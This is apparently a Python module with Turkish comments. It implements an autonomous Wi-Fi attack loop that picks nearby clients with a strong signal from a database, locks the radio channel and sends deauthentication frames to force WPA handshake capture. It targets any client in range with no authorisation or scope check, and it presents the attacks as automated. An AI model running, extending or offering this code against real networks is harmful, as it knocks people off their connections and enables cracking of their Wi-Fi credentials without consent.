import threading
import time
import logging
import random

log = logging.getLogger(__name__)

class AutoPilot:
    def __init__(self, db, scanner, attacker, ids):
        self.db = db
        self.scanner = scanner
        self.attacker = attacker
        self.ids = ids
        self._running = False
        self._thread = None

    def start(self):
        if self._running: return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        log.info("🤖 AutoPilot: Otonom saldırı modülü başlatıldı.")

    def stop(self):
        self._running = False
        log.info("🤖 AutoPilot: Durduruldu.")

    def _loop(self):
        """Ana karar döngüsü"""
        while self._running:
            try:
                # 1. Hedef Belirle (En güçlü sinyale sahip aktif clientlar)
                targets = self._get_best_targets()
                
                if not targets:
                    log.info("🤖 AutoPilot: Uygun hedef aranıyor...")
                    time.sleep(5)
                    continue

                for client_mac, ap_bssid, channel, rssi in targets:
                    if not self._running: break
                    
                    log.info(f"🤖 HEDEF KİLİTLENDİ: {client_mac} -> {ap_bssid} (CH: {channel})")
                    
                    # 2. Kanalı Kilitle (Scanner'ı yönet)
                    if hasattr(self.scanner, 'lock_channel'):
                        self.scanner.lock_channel(channel)
                        time.sleep(2) # Kanalın oturmasını bekle

                    # 3. Deauth Saldırısı Yap (Handshake zorlamak için)
                    if self.attacker:
                        # Saldırı öncesi veritabanına olay kaydet
                        self.db.execute("INSERT INTO ids_events (event_type, target, details, ts) VALUES (?,?,?,?)",
                                      ("AUTOPILOT_ATTACK", ap_bssid, f"Deauth sent to {client_mac}", time.time()))
                        
                        # Saldırıyı gerçekleştir
                        self.attacker.deauth_target(client_mac, ap_bssid, count=15)
                        log.info(f"⚡ Deauth paketleri gönderildi -> {client_mac}")
                    
                    # 4. Dinle (Handshake yakalamak için bekle)
                    time.sleep(5)
                    
                    # 5. Kanal Kilidini Aç ve Sonraki Hedefe Geç
                    if hasattr(self.scanner, 'unlock_channel'):
                        self.scanner.unlock_channel()
                    
                    time.sleep(2)

            except Exception as e:
                log.error(f"AutoPilot Döngü Hatası: {e}")
                time.sleep(5)

    def _get_best_targets(self):
        """
        Veritabanından saldırılabilecek en iyi hedefleri seçer.
        DÜZELTME: 'clients' tablosu ile 'client_connections' tablosu birleştirildi (JOIN).
        """
        try:
            # HATA BURADAYDI: Eskiden c.bssid aranıyordu, şimdi cc.ap_bssid alınıyor.
            query = """
                SELECT 
                    c.mac, 
                    cc.ap_bssid, 
                    n.channel, 
                    c.rssi
                FROM clients c
                JOIN client_connections cc ON c.mac = cc.client_mac
                JOIN networks n ON cc.ap_bssid = n.bssid
                WHERE c.rssi > -80  -- Sadece sinyali iyi olanlar
                AND n.channel > 0
                ORDER BY c.last_seen DESC, c.rssi DESC
                LIMIT 3
            """
            return self.db.query(query)
        except Exception as e:
            log.error(f"AutoPilot Hedef Seçimi Hatası: {e}")
            return []